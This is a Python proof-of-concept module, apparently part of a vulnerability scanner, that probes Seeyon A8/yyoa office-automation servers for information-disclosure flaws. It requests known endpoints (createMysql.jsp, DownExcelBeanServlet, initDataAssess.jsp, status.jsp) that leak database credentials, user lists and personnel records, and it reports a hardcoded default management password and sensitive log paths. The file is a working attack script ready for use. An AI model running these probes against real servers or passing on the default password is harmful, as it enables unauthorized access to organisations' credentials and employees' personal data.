# -*- coding: utf-8 -*- 

from poc import core

def cerateMysql(url):
	name='createMysql.jsp 数据库敏感信息泄'
	core.start_echo(name)
	path='/yyoa/createMysql.jsp'
	path2='/yyoa/ext/createMysql.jsp'
	r=core.get(url,path)
	if r:
		if r.status_code==200 and 'root' in r.text:
			core.end_echo(name,'Payload：'+url+path)
			core.result(name,url+path)
			return
	r=core.get(url,path2)
	if r:
		if r.status_code==200 and 'root' in r.text:
			core.end_echo(name,'Payload：'+url+path)
			core.result(name,url+path)
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)
def DownExcelBeanServlet(url):
	name='DownExcelBeanServlet 用户敏感信息泄露'
	path='/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
	core.start_echo(name)
	r=core.get(url,path)
	if r:
		if r.status_code==200 and 'xls' in str(r.headers).lower():
			core.end_echo(name,'Payload：'+url+path)
			core.result(name,url+path)
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)
def initDataAssess(url):
	name='initDataAssess.jsp 用户敏感信息泄露'
	path='/yyoa/assess/js/initDataAssess.jsp'
	core.start_echo(name)
	r=core.get(url,path)
	if r:
		if r.status_code==200 and 'personList' in r.text:
			core.end_echo(name,'Payload：'+url+path)
			core.result(name,url+path)			
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)
def status(url):
	name='A8 状态监控页面信息泄露'
	path='/seeyon/management/status.jsp'
	core.start_echo(name)
	r=core.get(url,path)
	if r:
		if r.status_code==200 and 'Password' in r.text:
			core.end_echo(name,'Payload：'+url+path)
			core.result(name,url+path,'默认密码：WLCCYBD@SEEYON'+'	敏感路径:/seeyon/logs/login.log	/seeyon/logs/v3x.log')			
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)

def check(url):
	status(url)
	cerateMysql(url)
	DownExcelBeanServlet(url)
	initDataAssess(url)

